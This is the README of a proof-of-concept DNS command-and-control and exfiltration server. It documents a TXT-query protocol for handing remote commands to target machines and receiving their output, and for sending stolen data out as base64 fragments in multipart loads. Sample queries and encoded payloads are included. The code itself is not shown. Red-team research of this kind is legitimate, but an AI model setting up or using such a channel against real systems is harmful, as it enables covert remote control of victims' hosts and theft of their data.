# DNS exfiltration server

DNS server weaponized to exfiltrate information

## Features

- Send task for targets (client) to execute as RCE
- Receive data from task execut
- Receive data in multipart load for data exceeding the DNS FQDN size limit

## Requirements

- Python3
- Install `dnslib` python module

```bash
pip install dnslib
# OR
pip3 install dnslib
```

## Usage

Set the following constants to define the SERVER 
**NOTE:** using `53` port requires root permissions

`EXPECTED_DOMAIN` is the domain to the client should send the request

```python
SERVER_ADDRESS = '0.0.0.0'
SERVER_PORT = 5353
EXPECTED_DOMAIN = 'domain.local'
```

To run the server use:

```bash
python3 ./server.py
```

The client file have predefined petitions to test the server it'll send a multipart load petitions
run the client with

```bash
python3 ./client_exfiltration_PoC.py
```

## Enabled petitions

Server have a set of enabled actions, all petitions should be send as TXT DNS request

**IMPORTANT:** This version only can receive the exfiltrated data as text not files

- **task:** get target task to execute it
- **result:** send task result
- **loadstart:** init the process of multipart load
- **load:** send each fragment of the multipart load
- **loadend:** finish the multipart load

Test TXT request without client:

```bash
dig @127.0.0.1 -p 5353 task.domain.local +short

"whoami"
```

### Get task

Use this petition to get the target taks from server
Command to be executed is received in the TXT register, also this petition can be use as callback to check `server <-> target` connection

Request syntax: `task.<expected_domain>`

Example: `task.domain.local`

**NOTE:** This server version only send `whoami` as task response

### Result

Send the task execution command result, use only when
full FDQN size is less than 255 chars, data should be sent as **b64 encoded string** to avoid bad chars

Request syntax: `<b64_encoded_data>.result.<expected_domain>`

Example: `bm9ucm9vdAo=.result.domain.local`

### Start multipart load

Start the process of multipart load for data exfiltrations where full FDQN exceeds the 255 chars

Resquest sysntax: `<total_parts>.<uuid>.loadstart.<domain>`

Example: `2.ex0d1.load.start.domain.local`

- **total_parts:** Numbers of the that will be sent to complete the multipart load
- **uuid:** identifier for the load process

### Load data fragment

Load into the server a data fragment, each data fragment must be b64 encoded to avoid bad chars

Request syntax: `<data>.<part_n>.<uuid>.load.<domain>`

Example: `dWlkPTEwMDAoMHo0aSkgZ2lkPTEwMDAoMHo0aSkgZ3JvdXBzPTEwMDAoMHo0aSk.sMjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcC.0.ex0d1.load.domain.local`

- **data:** Are the fragmented data such as subdomains, each of which must not exceed 63 chars (64 with .)
- **part_n:** Is the number of the request send, it should be from 0 to n

### End the multipart load

Is the last petition of the multipart load process, it tells the server that will not receive any more request from that process

Request syntax: `<uuid>.loadend.<domain>`

Example: `ex0d1.loadend.domain.local`

---

**⚠️⚠️⚠️ WARNING:** This repo is just a PoC, don't use for malicious purposes
> Don't be stupid jail is real
